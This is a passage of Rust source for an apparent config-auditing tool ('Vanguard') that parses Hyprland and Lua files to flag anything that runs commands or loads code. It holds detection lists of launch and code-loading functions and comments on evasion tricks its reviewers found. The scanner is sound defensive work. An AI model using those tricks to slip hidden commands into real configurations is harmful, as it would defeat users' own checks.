/// Chaque commande, si elle est ambiguë (des règles sans « ] »), et la sorte de la ligne.
fn lancements_de_hypr(ligne: &str) -> Vec<(String, bool, Ajout)> {
    let l = ligne.trim();
    if commentaire(l) {
        return Vec::new();
    }
    let Some((cle, valeur)) = l.split_once('=') else {
        return Vec::new();
    };
    let dans_une_categorie = cle.contains('{');
    let cle = cle.rsplit('{').next().unwrap_or_default().trim();
    let mut valeur = valeur.trim();
    if dans_une_categorie {
        valeur = valeur.strip_suffix('}').unwrap_or(valeur).trim();
    }
    let sans_regles = |v: &str| -> (String, bool) {
        match v.strip_prefix('[') {
            Some(reste) => match reste.split_once(']') {
                Some((_, commande)) => (commande.trim().to_string(), false),
                None => (v.to_string(), true),
            },
            None => (v.to_string(), false),
        }
    };
    let mut trouves = Vec::new();
    let raccourci = cle
        .strip_prefix("bind")
        .is_some_and(|drapeaux| drapeaux.bytes().all(|b| b.is_ascii_lowercase()));
    if raccourci || cle == "gesture" {
        let champs: Vec<&str> = valeur.split(',').collect();
        for (i, champ) in champs.iter().enumerate().skip(2) {
            let repartiteur = champ.trim();
            let reste = || {
                champs
                    .get(i.saturating_add(1)..)
                    .unwrap_or_default()
                    .join(",")
                    .trim()
                    .to_string()
            };
            if repartiteur.eq_ignore_ascii_case("exec") {
                let (c, ambigue) = sans_regles(&reste());
                trouves.push((c, ambigue, Ajout::Raccourci));
            } else if repartiteur.eq_ignore_ascii_case("execr") {
                trouves.push((reste(), false, Ajout::Raccourci));
            }
        }
        return trouves;
    }
    if ["exec-once", "exec", "execr-once", "execr", "exec-shutdown"].contains(&cle) {
        if valeur.starts_with('[') {
            let (c, ambigue) = sans_regles(valeur);
            trouves.push((c, ambigue, Ajout::LancementHypr));
        } else if dans_une_categorie {
            trouves.push((valeur.to_string(), false, Ajout::LancementHypr));
        }
        return trouves;
    }
    if CLES_DE_HYPR.contains(&cle) {
        trouves.push((valeur.to_string(), false, Ajout::CleHypr));
    }
    trouves
}

/// Les clés des fichiers de Hyprland, d'hypridle et d'hyprlock qui chargent du code ou lancent une commande, hors des
/// « exec… » et des raccourcis (relecture adverse, C8).
const CLES_DE_HYPR: [&str; 9] = [
    "plugin",
    "on-timeout",
    "on-resume",
    "lock_cmd",
    "unlock_cmd",
    "on_lock_cmd",
    "on_unlock_cmd",
    "before_sleep_cmd",
    "after_sleep_cmd",
];

/// La clé d'une ligne de Hyprland, catégorie écrite sur la ligne ôtée (« x { exec-once » est « exec-once »).
fn cle_de_hypr(ligne: &str) -> Option<&str> {
    let (cle, _) = ligne.trim().split_once('=')?;
    Some(cle.rsplit('{').next().unwrap_or_default().trim())
}

/// Une clé de Hyprland qui lance ou charge quelque chose (`lancements_de_hypr`, `commande_lancee_lue`).
fn cle_qui_lance(cle: &str) -> bool {
    cle.strip_prefix("bind")
        .is_some_and(|d| d.bytes().all(|b| b.is_ascii_lowercase()))
        || cle == "gesture"
        || cle == "source"
        || ["exec-once", "exec", "execr-once", "execr", "exec-shutdown"].contains(&cle)
        || CLES_DE_HYPR.contains(&cle)
}

/// Une ligne de Hyprland telle que la lit hyprlang : coupée sur « \n » seul (« \r » reste dans la ligne), une ligne
/// qui finit par « \ » jointe à la suivante sans rien entre les deux (relecture adverse, B3 : « \ » suivi d'un
/// blanc n'est pas une continuation). Le numéro de sa première ligne (à partir de 0), combien de lignes écrites elle
/// joint, son texte.
fn lignes_de_hyprlang(texte: &str) -> Vec<(usize, usize, String)> {
    let mut sortie = Vec::new();
    let mut cours: Option<(usize, usize, String)> = None;
    for (n, brute) in texte.split('\n').enumerate() {
        let (debut, lues, mut joint) = cours.take().unwrap_or((n, 0, String::new()));
        joint.push_str(brute);
        let lues = lues.saturating_add(1);
        if joint.ends_with('\\') {
            joint.pop();
            cours = Some((debut, lues, joint));
        } else {
            sortie.push((debut, lues, joint));
        }
    }
    if let Some(c) = cours {
        sortie.push(c);
    }
    // Une fin de fichier en « \n » laisse une dernière ligne vide, que rien ne lit.
    if sortie.last().is_some_and(|(_, _, l)| l.is_empty()) {
        sortie.pop();
    }
    sortie
}

/// Au plus autant d'appels lus dans un fichier Lua ; au-delà, le reste n'est pas vérifié (dit dans l'alerte).
const APPELS_LUA_MAX: usize = 4096;

/// Un jeton d'un texte Lua : un nom (mot-clé compris ; ses parties jointes par « . » : « o.bind », « o:bind » et
/// `o["bind"]` valent « o.bind »), une chaîne (son contenu décodé comme Lua le décode), ou un autre signe.
#[derive(Debug, Clone, PartialEq)]
enum JetonLua {
    Nom(String),
    Chaine(String),
    Signe(String),
}

/// Le niveau d'une longue parenthèse Lua qui s'ouvre en `i` (« [[ » : 0, « [==[ » : 2), et où commence son contenu.
fn longue_ouverte(c: &[char], i: usize) -> Option<(usize, usize)> {
    if c.get(i) != Some(&'[') {
        return None;
    }
    let mut j = i.checked_add(1)?;
    while c.get(j) == Some(&'=') {
        j = j.checked_add(1)?;
    }
    (c.get(j) == Some(&'[')).then(|| (j.saturating_sub(i).saturating_sub(1), j.saturating_add(1)))
}

/// Lit une longue chaîne ou un long commentaire de `niveau` à partir de `i` : son contenu (le premier retour à la
/// ligne sauté, comme Lua), où elle finit, combien de lignes elle traverse. Non fermée : jusqu'à la fin.
fn longue_lue(c: &[char], mut i: usize, niveau: usize) -> (String, usize, usize) {
    let mut contenu = String::new();
    let mut lignes = 0_usize;
    if c.get(i) == Some(&'\r') {
        i = i.saturating_add(1);
    }
    if c.get(i) == Some(&'\n') {
        i = i.saturating_add(1);
        lignes = 1;
    }
    while let Some(&x) = c.get(i) {
        if x == ']' {
            let egal = c
                .get(i.saturating_add(1)..)
                .unwrap_or_default()
                .iter()
                .take_while(|y| **y == '=')
                .count();
            if egal == niveau && c.get(i.saturating_add(1).saturating_add(egal)) == Some(&']') {
                return (contenu, i.saturating_add(2).saturating_add(egal), lignes);
            }
        }
        if x == '\n' {
            lignes = lignes.saturating_add(1);
        }
        contenu.push(x);
        i = i.saturating_add(1);
    }
    (contenu, i, lignes)
}

/// Les jetons d'un texte Lua, chacun avec le numéro de sa ligne (à partir de 0) ; commentaires (« -- », « --[[ ]] »,
/// « --[==[ ]==] ») sautés, chaînes décodées (« \n », « \ddd », « \xHH », « \u{…} », « \z » ; relecture adverse,
/// B4), noms joints (`JetonLua`). Une chaîne qui ne se ferme pas finit à la fin de sa ligne (Lua refuserait le
/// fichier). Une fin de ligne est, comme pour Lua, « \n », « \r », « \r\n » ou « \n\r » (vérification 2, N9 : un
/// « -- » fini par un retour chariot seul cachait l'appel qui le suit).
fn jetons_lua(texte: &str) -> Vec<(JetonLua, usize)> {
    // Comme luaL_loadfilex (vérification 3, H4) : une marque d'ordre des octets ôtée, puis une 1re ligne qui commence
    // par « # » sautée jusqu'à sa fin (son « \n » gardé pour compter les lignes) ; sinon un « --[[ » écrit dessus
    // cacherait à Vanguard les lignes que Lua exécute.
    let texte = texte.strip_prefix('\u{feff}').unwrap_or(texte);
    let texte = if texte.starts_with('#') {
        texte
            .find(['\n', '\r'])
            .map_or("", |i| texte.get(i..).unwrap_or_default())
    } else {
        texte
    };
    let mut c: Vec<char> = Vec::with_capacity(texte.len());
    let mut lettres = texte.chars().peekable();
    while let Some(x) = lettres.next() {
        if x == '\r' || x == '\n' {
            lettres.next_if_eq(&if x == '\n' { '\r' } else { '\n' });
            c.push('\n');
        } else {
            c.push(x);
        }
    }
    let mut jetons: Vec<(JetonLua, usize)> = Vec::new();
    let mut ligne = 0_usize;
    let mut i = 0_usize;
    while let Some(&x) = c.get(i) {
        let suivant = c.get(i.saturating_add(1)).copied();
        if x == '\n' {
            ligne = ligne.saturating_add(1);
            i = i.saturating_add(1);
        } else if x.is_whitespace() {
            i = i.saturating_add(1);
        } else if x == '-' && suivant == Some('-') {
            let debut = i.saturating_add(2);
            if let Some((niveau, contenu)) = longue_ouverte(&c, debut) {
                let (_, fin, lignes) = longue_lue(&c, contenu, niveau);
                ligne = ligne.saturating_add(lignes);
                i = fin;
            } else {
                i = debut;
                while c.get(i).is_some_and(|y| *y != '\n') {
                    i = i.saturating_add(1);
                }
            }
        } else if let Some((niveau, contenu)) = longue_ouverte(&c, i) {
            let (chaine, fin, lignes) = longue_lue(&c, contenu, niveau);
            jetons.push((JetonLua::Chaine(chaine), ligne));
            ligne = ligne.saturating_add(lignes);
            i = fin;
        } else if x == '"' || x == '\'' {
            let debut = ligne;
            let mut octets: Vec<u8> = Vec::new();
            i = i.saturating_add(1);
            while let Some(&y) = c.get(i) {
                i = i.saturating_add(1);
                if y == x || y == '\n' {
                    if y == '\n' {
                        ligne = ligne.saturating_add(1);
                    }
                    break;
                }
                if y != '\\' {
                    let mut tampon = [0_u8; 4];
                    octets.extend_from_slice(y.encode_utf8(&mut tampon).as_bytes());
                    continue;
                }
                let Some(&e) = c.get(i) else { break };
                i = i.saturating_add(1);
                let simple = match e {
                    'a' => Some(7),
                    'b' => Some(8),
                    'f' => Some(12),
                    'n' | '\n' => Some(b'\n'),
                    'r' => Some(b'\r'),
                    't' => Some(b'\t'),
                    'v' => Some(11),
                    _ => None,
                };
                if e == '\n' {
                    ligne = ligne.saturating_add(1);
                }
                if let Some(o) = simple {
                    octets.push(o);
                } else if e == 'z' {
                    while let Some(&b) = c.get(i).filter(|b| b.is_whitespace()) {
                        if b == '\n' {
                            ligne = ligne.saturating_add(1);
                        }
                        i = i.saturating_add(1);
                    }
                } else if e == 'x' {
                    let hex: String = c.get(i..).unwrap_or_default().iter().take(2).collect();
                    if let Ok(o) = u8::from_str_radix(&hex, 16) {
                        octets.push(o);
                        i = i.saturating_add(2);
                    }
                } else if e.is_ascii_digit() {
                    let mut valeur = e.to_digit(10).unwrap_or(0);
                    for _ in 0..2 {
                        let Some(d) = c.get(i).and_then(|d| d.to_digit(10)) else {
                            break;
                        };
                        valeur = valeur.saturating_mul(10).saturating_add(d);
                        i = i.saturating_add(1);
                    }
                    octets.push(u8::try_from(valeur).unwrap_or(u8::MAX));
                } else if e == 'u' && c.get(i) == Some(&'{') {
                    let hex: String = c
                        .get(i.saturating_add(1)..)
                        .unwrap_or_default()
                        .iter()
                        .take_while(|h| h.is_ascii_hexdigit())
                        .collect();
                    i = i.saturating_add(1).saturating_add(hex.len());
                    if c.get(i) == Some(&'}') {
                        i = i.saturating_add(1);
                    }
                    let lettre = u32::from_str_radix(&hex, 16)
                        .ok()
                        .and_then(char::from_u32)
                        .unwrap_or('\u{fffd}');
                    let mut tampon = [0_u8; 4];
                    octets.extend_from_slice(lettre.encode_utf8(&mut tampon).as_bytes());
                } else {
                    let mut tampon = [0_u8; 4];
                    octets.extend_from_slice(e.encode_utf8(&mut tampon).as_bytes());
                }
            }
            jetons.push((JetonLua::Chaine(String::from_utf8_lossy(&octets).into_owned()), debut));
        } else if x.is_alphabetic() || x == '_' {
            let mut nom = String::new();
            while let Some(&y) = c.get(i).filter(|y| y.is_alphanumeric() || **y == '_') {
                nom.push(y);
                i = i.saturating_add(1);
            }
            jetons.push((JetonLua::Nom(nom), ligne));
        } else if x.is_ascii_digit() || (x == '.' && suivant.is_some_and(|s| s.is_ascii_digit())) {
            let mut nombre = String::new();
            while let Some(&y) = c.get(i).filter(|y| y.is_ascii_alphanumeric() || **y == '.') {
                if y == '.' && c.get(i.saturating_add(1)) == Some(&'.') {
                    break;
                }
                nombre.push(y);
                i = i.saturating_add(1);
            }
            jetons.push((JetonLua::Signe(nombre), ligne));
        } else {
            let deux: String = c.get(i..).unwrap_or_default().iter().take(3).collect();
            let signe = ["...", "..", "==", "~=", "<=", ">=", "::", "//", "<<", ">>"]
                .into_iter()
                .find(|s| deux.starts_with(s))
                .map_or_else(|| x.to_string(), str::to_string);
            i = i.saturating_add(signe.chars().count());
            jetons.push((JetonLua::Signe(signe), ligne));
        }
    }
    // Les noms joints : « a.b », « a:b » et « a["b"] » (relecture adverse, B4 : « hl.dsp.exec_cmd »).
    let mut joints: Vec<(JetonLua, usize)> = Vec::with_capacity(jetons.len());
    let mut k = 0_usize;
    while let Some((jeton, l)) = jetons.get(k).cloned() {
        let precedent = joints.last_mut().and_then(|(j, _)| match j {
            JetonLua::Nom(n) => Some(n),
            _ => None,
        });
        let apres = |d: usize| jetons.get(k.saturating_add(d)).map(|(j, _)| j);
        if let Some(nom) = precedent {
            let point = matches!(&jeton, JetonLua::Signe(s) if s == "." || s == ":");
            if point && let Some(JetonLua::Nom(suite)) = apres(1) {
                nom.push('.');
                nom.push_str(suite);
                k = k.saturating_add(2);
                continue;
            }
            let crochet = matches!(&jeton, JetonLua::Signe(s) if s == "[");
            if crochet
                && let (Some(JetonLua::Chaine(suite)), Some(JetonLua::Signe(fin))) = (apres(1), apres(2))
                && fin == "]"
            {
                nom.push('.');
                nom.push_str(suite);
                k = k.saturating_add(3);
                continue;
            }
        }
        joints.push((jeton, l));
        k = k.saturating_add(1);
    }
    joints
}

/// Les mots-clés de Lua : jamais des noms de variable ni de fonction.
const MOTS_CLES_LUA: [&str; 22] = [
    "and", "break", "do", "else", "elseif", "end", "false", "for", "function", "goto", "if", "in", "local", "nil",
    "not", "or", "repeat", "return", "then", "true", "until", "while",
];

/// Ce que fait un appel Lua nommé `nom` (relecture adverse, B4) : lancer une commande ou charger du code lu ailleurs.
#[derive(Debug, Clone, Copy, PartialEq)]
enum AppelLua {
    /// « exec_cmd », « exec_raw », « launch », « exec_on_start »…, « os.execute », « io.popen », « hl.plugin.load » :
    /// chaque argument est une commande (ou un greffon) ; un argument qui ne se lit pas est dit.
    Lance,
    /// Un raccourci (« bind », « bind_hold », « rebind ») : chaque chaîne se juge ; une fonction donnée en argument
    /// se lit pour elle-même ; un argument qui ne se lit pas est dit.
    Raccourci,
    /// « dofile », « loadfile » : un chemin écrit en toutes lettres se juge et doit mener à un fichier lu ; un chemin
    /// calculé ne se lit pas (« os.getenv("OMARCHY_PATH") or … », la forme du modèle d'Omarchy, vaut sa valeur par
    /// défaut : OMARCHY_PATH se juge là où il se pose).
    Fichier,
    /// « require » : un nom calculé est dit ; un nom écrit doit mener à un module lu (`module_hors_lecture`).
    Module,
    /// « load », « loadstring », « package.loadlib », « rawget », « rawset », « debug.setlocal »… : du code, une
    /// fonction ou une valeur qui ne se voit pas.
    Code,
}

/// La sorte d'un nom Lua (« _G. » et « _ENV. » ôtés), ou `None`.
fn appel_lua(nom: &str) -> Option<AppelLua> {
    let nom = nom.trim_start_matches("_G.").trim_start_matches("_ENV.");
    let fin = nom.rsplit('.').next().unwrap_or(nom);
    if nom.ends_with("plugin.load")
        || [
            "exec_cmd",
            "exec_raw",
            "exec_once",
            "exec_on_start",
            "launch",
            "launch_on_start",
            "execute",
            "popen",
            // Aides d'Omarchy (default/hypr/helpers.lua) qui lancent ou rendent une commande (vérification 2, N9).
            "shell_succeeds",
            "launch_sole",
            "launch_webapp",
            "launch_webapp_sole",
        ]
        .contains(&fin)
    {
        Some(AppelLua::Lance)
    } else if fin == "bind" || fin == "rebind" || fin.starts_with("bind_") {
        Some(AppelLua::Raccourci)
    } else if nom == "dofile" || nom == "loadfile" {
        Some(AppelLua::Fichier)
    } else if nom == "require" {
        Some(AppelLua::Module)
    } else if [
        "load",
        "loadstring",
        "loadlib",
        "rawget",
        "rawset",
        "setfenv",
        "setlocal",
        "setupvalue",
        "upvaluejoin",
    ]
    .contains(&fin)
    {
        Some(AppelLua::Code)
    } else {
        None
    }
}

/// Un appel Lua qui lance ou charge (`appels_lua`) : sa première et sa dernière ligne (à partir de 0), ses
/// commandes lues en toutes lettres, et pourquoi il n'est pas lu en entier s'il ne l'est pas.
#[derive(Debug, PartialEq)]
struct AppelLu {
    debut: usize,
    fin: usize,
    commandes: Vec<String>,
    /// Ce qui se lit sans être une ligne de shell (touches et description d'un raccourci, chemin d'un « dofile ») :
    /// ses seuls mots jugés.
    textes: Vec<String>,
    /// Les noms écrits d'un « require », les chemins écrits d'un « dofile » : où ils mènent se vérifie
    /// (`charge_hors_lecture`).
    modules: Vec<String>,
    fichiers: Vec<String>,
    non_lu: Option<&'static str>,
}

/// La raison d'un appel Lua de lancement dont la commande ne se lit pas en toutes lettres.
fn commande_lua_non_lue() -> &'static str {
    tr!(
        "commande Lua que Vanguard ne lit pas en toutes lettres (variable, calcul ou fonction) : ce qu'elle lance n'est pas vérifié",
        "Lua command Vanguard cannot read spelled out (variable, computation or function): what it starts is not checked"
    )
}

/// La raison d'un code Lua chargé que Vanguard ne lit pas.
fn code_lua_non_lu() -> &'static str {
    tr!(
        "code Lua chargé d'une chaîne, d'une bibliothèque, d'un nom calculé ou d'un chemin de modules changé (load, package.loadlib, require, package.path) : non vérifié",
        "Lua code loaded from a string, a library, a computed name or a changed module path (load, package.loadlib, require, package.path): not checked"
    )
}

/// La raison d'une fonction Lua qui lance, renommée ou redéfinie.
fn fonction_lua_renommee() -> &'static str {
    tr!(
        "fonction Lua qui lance une commande, renommée ou redéfinie : ce qu'elle lance ne se voit pas",
        "Lua function that starts a command, renamed or redefined: what it starts cannot be seen"
    )
}

/// Où se ferme le groupe ouvert en `i` (« ( », « { », « [ »), bloc « function … end » compris, ou la fin.
fn fermeture_lua(jetons: &[(JetonLua, usize)], i: usize) -> usize {
    let mut profondeur = 0_i64;
    let mut k = i;
    while let Some((j, _)) = jetons.get(k) {
        match j {
            JetonLua::Signe(s) if ["(", "{", "["].contains(&s.as_str()) => profondeur = profondeur.saturating_add(1),
            JetonLua::Signe(s) if [")", "}", "]"].contains(&s.as_str()) => {
                profondeur = profondeur.saturating_sub(1);
                if profondeur <= 0 {
                    return k;
                }
            }
            _ => {}
        }
        k = k.saturating_add(1);
    }
    jetons.len().saturating_sub(1)
}

/// Les éléments d'une liste Lua (arguments d'un appel, champs d'une table), coupée sur « , » et « ; » hors des
/// groupes et des blocs « function … end ».
fn elements_lua(jetons: &[(JetonLua, usize)]) -> Vec<&[(JetonLua, usize)]> {
    let mut elements = Vec::new();
    let (mut groupes, mut blocs) = (0_i64, 0_i64);
    let mut debut = 0_usize;
    for (k, (j, _)) in jetons.iter().enumerate() {
        match j {
            JetonLua::Signe(s) if ["(", "{", "["].contains(&s.as_str()) => groupes = groupes.saturating_add(1),
            JetonLua::Signe(s) if [")", "}", "]"].contains(&s.as_str()) => groupes = groupes.saturating_sub(1),
            JetonLua::Nom(n) if ["function", "do", "if", "repeat"].contains(&n.as_str()) => {
                blocs = blocs.saturating_add(1);
            }
            JetonLua::Nom(n) if n == "end" || n == "until" => blocs = blocs.saturating_sub(1),
            JetonLua::Signe(s) if (s == "," || s == ";") && groupes == 0 && blocs == 0 => {
                elements.push(jetons.get(debut..k).unwrap_or_default());
                debut = k.saturating_add(1);
            }
            _ => {}
        }
    }
    let reste = jetons.get(debut..).unwrap_or_default();
    if !reste.is_empty() {
        elements.push(reste);
    }
    elements
}

/// Les valeurs posées dans un fichier Lua pour chaque nom (« local x = "…" », « x = a .. "…" »), toutes (sans
/// ordre : une fonction appelée plus tard voit la dernière) ; `None` dans la liste : une valeur que Vanguard ne lit
/// pas (relecture adverse, B4 : « local terminal = … » puis « exec_cmd(terminal) », l'exemple de Hyprland).
type LocalesLua = std::collections::BTreeMap<String, Vec<Option<String>>>;

/// « os.getenv("OMARCHY_PATH") or x » : x, la valeur par défaut, comme dans le modèle d'Omarchy (`AppelLua::Fichier`) ;
/// OMARCHY_PATH se juge là où il se pose (`variable_d_injection`). Toute autre expression, telle quelle.
fn defaut_d_omarchy(jetons: &[(JetonLua, usize)]) -> &[(JetonLua, usize)] {
    match jetons {
        [
            (JetonLua::Nom(f), _),
            (JetonLua::Signe(a), _),
            (JetonLua::Chaine(v), _),
            (JetonLua::Signe(b), _),
            (JetonLua::Nom(ou), _),
            reste @ ..,
        ] if f == "os.getenv" && a == "(" && v == "OMARCHY_PATH" && b == ")" && ou == "or" => reste,
        _ => jetons,
    }
}

/// Un nom Lua sans « _G. » ni « _ENV. » devant : « _G.c » est le global « c ».
fn nom_global(nom: &str) -> &str {
    let mut n = nom;
    while let Some(reste) = n.strip_prefix("_G.").or_else(|| n.strip_prefix("_ENV.")) {
        n = reste;
    }
    n
}

/// Les formes d'une expression Lua faite de chaînes, de noms posés (`LocalesLua`), de « os.getenv("HOME") » (lu
/// « $HOME ») et de « .. », parenthèses comprises ; `None` si l'une de ses parties ne se lit pas, ou trop de formes.
fn valeurs_lua(jetons: &[(JetonLua, usize)], locales: &LocalesLua) -> Option<Vec<String>> {
    let mut formes = vec![String::new()];
    let mut k = 0_usize;
    loop {
        let suite: Vec<String> = match jetons.get(k).map(|(j, _)| j) {
            Some(JetonLua::Chaine(s)) => {
                k = k.saturating_add(1);
                vec![s.clone()]
            }
            Some(JetonLua::Signe(s)) if s == "(" => {
                let fin = fermeture_lua(jetons, k);
                let dedans = valeurs_lua(defaut_d_omarchy(jetons.get(k.saturating_add(1)..fin)?), locales)?;
                k = fin.saturating_add(1);
                dedans
            }
            Some(JetonLua::Nom(n)) if n == "os.getenv" => {
                let (Some(JetonLua::Signe(ouvre)), Some(JetonLua::Chaine(nom)), Some(JetonLua::Signe(ferme))) = (
                    jetons.get(k.saturating_add(1)).map(|(j, _)| j),
                    jetons.get(k.saturating_add(2)).map(|(j, _)| j),
                    jetons.get(k.saturating_add(3)).map(|(j, _)| j),
                ) else {
                    return None;
                };
                // Seul HOME se connaît : la valeur d'une autre variable entre telle quelle dans la ligne de shell
                // (vérification 2, N9 : « os.getenv("ZZ") .. "/agent" » se lisait « $ZZ/agent »).
                if ouvre != "(" || ferme != ")" || nom != "HOME" {
                    return None;
                }
                k = k.saturating_add(4);
                vec!["$HOME".to_string()]
            }
            Some(JetonLua::Nom(n)) if !MOTS_CLES_LUA.contains(&n.as_str()) => {
                k = k.saturating_add(1);
                locales
                    .get(nom_global(n))?
                    .iter()
                    .cloned()
                    .collect::<Option<Vec<String>>>()?
            }
            _ => return None,
        };
        formes = formes
            .iter()
            .flat_map(|f| suite.iter().map(move |s| format!("{f}{s}")))
            .collect();
        if formes.len() > FORMES_MAX {
            return None;
        }
        match jetons.get(k).map(|(j, _)| j) {
            None => return Some(formes),
            Some(JetonLua::Signe(s)) if s == ".." => k = k.saturating_add(1),
            Some(_) => return None,
        }
    }
}

/// Un élément Lua qui ne lance rien par lui-même : un nombre, « true », « false », « nil », un bloc
/// « function … end » (ses appels se lisent pour eux-mêmes) ou un appel d'un répartiteur (« hl.dsp.… »).
fn element_sans_commande(jetons: &[(JetonLua, usize)]) -> bool {
    match jetons.first().map(|(j, _)| j) {
        Some(JetonLua::Nom(n)) if n == "function" => true,
        Some(JetonLua::Nom(n)) if ["true", "false", "nil"].contains(&n.as_str()) => jetons.len() == 1,
        Some(JetonLua::Nom(n)) if n.starts_with("hl.dsp.") && appel_lua(n) != Some(AppelLua::Lance) => true,
        Some(JetonLua::Nom(n)) if appel_lua(n) == Some(AppelLua::Lance) => {
            // Un appel, entier : ses commandes se lisent pour lui-même.
            matches!(jetons.get(1).map(|(j, _)| j), Some(JetonLua::Signe(s)) if s == "(")
                && fermeture_lua(jetons, 1) == jetons.len().saturating_sub(1)
        }
        // Un nombre (« 5 », « .5 ») ; pas « ... », les arguments d'une fonction (vérification 2, N9).
        Some(JetonLua::Signe(s)) => {
            let mut lettres = s.chars();
            jetons.len() == 1
                && match lettres.next() {
                    Some('.') => lettres.next().is_some_and(|c| c.is_ascii_digit()),
                    Some(c) => c.is_ascii_digit(),
                    None => false,
                }
        }
        _ => false,
    }
}

/// Une table de raccourci d'Omarchy (« { menu = "power" } », « { launch = "x", focus = "^x$" } ») : la commande
/// qu'en fait Omarchy (`command_from` de helpers.lua), champ prioritaire d'abord, les valeurs entre guillemets simples
/// comme `shell_quote`. Un motif (« focus ») ou un nom de menu n'est pas une commande : lu champ par champ, il ne
/// passerait pas la liste permise (vérification 3). `None` pour un champ qui n'est pas d'Omarchy, répété ou illisible :
/// la table se lit alors champ par champ.
fn table_d_omarchy(dedans: &[(JetonLua, usize)], locales: &LocalesLua) -> Option<Vec<String>> {
    const CHAMPS: [&str; 11] = [
        "omarchy",
        "menu",
        "panel",
        "audio",
        "brightness",
        "ipc",
        "focus",
        "launch",
        "webapp",
        "tui",
        "description",
    ];
    let mut champs: std::collections::BTreeMap<&str, Vec<String>> = std::collections::BTreeMap::new();
    for champ in elements_lua(dedans) {
        let (Some(JetonLua::Nom(n)), Some(JetonLua::Signe(e))) =
            (champ.first().map(|(j, _)| j), champ.get(1).map(|(j, _)| j))
        else {
            return None;
        };
        let nom = CHAMPS.iter().find(|c| **c == n.as_str())?;
        let valeur = champ.get(2..).unwrap_or_default();
        let formes = match valeur {
            [(JetonLua::Nom(v), _)] if v == "true" && *nom == "focus" => vec!["true".to_string()],
            _ => valeurs_lua(valeur, locales)?,
        };
        if e != "=" || champs.insert(nom, formes).is_some() {
            return None;
        }
    }
    let q = |v: &str| format!("'{}'", v.replace('\'', "'\\''"));
    let chacun = |cle: &str, f: &dyn Fn(&str) -> Option<String>| -> Option<Vec<String>> {
        champs.get(cle)?.iter().map(|v| f(v)).collect()
    };
    let lues = if let Some(l) = chacun("omarchy", &|v| Some(format!("omarchy-launch-{v}"))) {
        l
    } else if let Some(l) = chacun("menu", &|v| Some(format!("omarchy-menu toggle {}", q(v)))) {
        l
    } else if let Some(l) = chacun("panel", &|v| Some(format!("omarchy-shell shell toggle {}", q(v)))) {
        l
    } else if let Some(l) = chacun("audio", &|v| Some(format!("omarchy-audio-output-volume {}", q(v)))) {
        l
    } else if let Some(l) = chacun("brightness", &|v| {
        Some(format!(
            "omarchy-brightness-display {}",
            if v == "raise" { "+5%" } else { "5%-" }
        ))
    }) {
        l
    } else if champs.contains_key("ipc") {
        // « cible.méthode » ; sans point, Lua s'arrête sur une erreur : rien ne se lance, mais la table se lit à part.
        chacun("ipc", &|v| {
            let (cible, methode) = v.split_once('.')?;
            (!cible.is_empty() && !methode.is_empty()).then(|| format!("omarchy-shell {} {}", q(cible), q(methode)))
        })?
    } else if let (Some(motifs), Some(l)) = (champs.get("focus"), champs.get("launch")) {
        motifs
            .iter()
            .flat_map(|m| l.iter().map(move |c| (m, c)))
            .map(|(m, c)| format!("omarchy-launch-or-focus {} {}", q(m), q(&format!("uwsm-app -- {c}"))))
            .collect()
    } else if let Some(l) = chacun("launch", &|v| Some(format!("uwsm-app -- {v}"))) {
        l
    } else if champs.contains_key("webapp") {
        // Avec « focus », le nom de la fenêtre est la description du raccourci : du texte, que la commande cite.
        chacun("webapp", &|v| Some(format!("omarchy-launch-webapp {}", q(v))))?
    } else if champs.contains_key("focus") {
        chacun("tui", &|v| Some(format!("omarchy-launch-or-focus-tui {}", q(v))))?
    } else {
        chacun("tui", &|v| Some(format!("omarchy-launch-tui {}", q(v))))?
    };
    (lues.len() <= FORMES_MAX).then_some(lues)
}

/// Lit un élément d'un appel qui lance (`AppelLua::Lance`, `AppelLua::Raccourci`) : ses commandes en toutes lettres
/// dans `commandes` ; faux s'il ne se lit pas. Une table se lit champ par champ.
fn element_lu(jetons: &[(JetonLua, usize)], locales: &LocalesLua, commandes: &mut Vec<String>) -> bool {
    if element_sans_commande(jetons) {
        return true;
    }
    if matches!(jetons.first().map(|(j, _)| j), Some(JetonLua::Signe(s)) if s == "{")
        && fermeture_lua(jetons, 0) == jetons.len().saturating_sub(1)
    {
        let dedans = jetons.get(1..jetons.len().saturating_sub(1)).unwrap_or_default();
        if let Some(lues) = table_d_omarchy(dedans, locales) {
            commandes.extend(lues);
            return true;
        }
        return elements_lua(dedans).into_iter().all(|champ| {
            // « nom = valeur » et « [clé] = valeur » : la valeur.
            let valeur = match (champ.first().map(|(j, _)| j), champ.get(1).map(|(j, _)| j)) {
                // La description d'un raccourci (« { description = "…" } ») ne se lance pas.
                (Some(JetonLua::Nom(n)), Some(JetonLua::Signe(s))) if s == "=" && n == "description" => return true,
                // « { omarchy = "x" } » d'Omarchy lance « omarchy-launch-x », sans guillemets autour de « x »
                // (helpers.lua, command_from ; vérification 2, N9).
                (Some(JetonLua::Nom(n)), Some(JetonLua::Signe(s))) if s == "=" && n == "omarchy" => {
                    let mut lues = Vec::new();
                    let lu = element_lu(champ.get(2..).unwrap_or_default(), locales, &mut lues);
                    commandes.extend(lues.into_iter().map(|c| format!("omarchy-launch-{c}")));
                    return lu;
                }
                (Some(JetonLua::Nom(_)), Some(JetonLua::Signe(s))) if s == "=" => champ.get(2..).unwrap_or_default(),
                (Some(JetonLua::Signe(s)), _) if s == "[" => {
                    let fin = fermeture_lua(champ, 0);
                    match champ.get(fin.saturating_add(1)).map(|(j, _)| j) {
                        Some(JetonLua::Signe(e)) if e == "=" => champ.get(fin.saturating_add(2)..).unwrap_or_default(),
                        _ => champ,
                    }
                }
                _ => champ,
            };
            element_lu(valeur, locales, commandes)
        });
    }
    match valeurs_lua(jetons, locales) {
        Some(formes) => {
            commandes.extend(formes);
            true
        }
        None => false,
    }
}

/// Vérification 3, point 4 : un élément d'un appel qui lance ne se lit que s'il est écrit en toutes lettres : des
/// chaînes (jointes par « .. »), des nombres, « true », « false », « nil », et des tables de champs nommés qui en
/// sont faites ; ou ce qu'`element_sans_commande` laisse aux appels lus pour eux-mêmes. Un nom posé ailleurs, un
/// « os.getenv », un autre appel ne se lisent pas : l'appel est levé « non lu », même si la valeur se retrouverait.
fn litterale_lua(jetons: &[(JetonLua, usize)]) -> bool {
    if element_sans_commande(jetons) {
        return true;
    }
    jetons.iter().enumerate().all(|(k, (j, _))| match j {
        JetonLua::Chaine(_) => true,
        JetonLua::Signe(s) => {
            matches!(s.as_str(), ".." | "(" | ")" | "{" | "}" | "," | ";" | "=")
                || s.chars().next().is_some_and(|c| c.is_ascii_digit())
        }
        JetonLua::Nom(n) => {
            ["true", "false", "nil"].contains(&n.as_str())
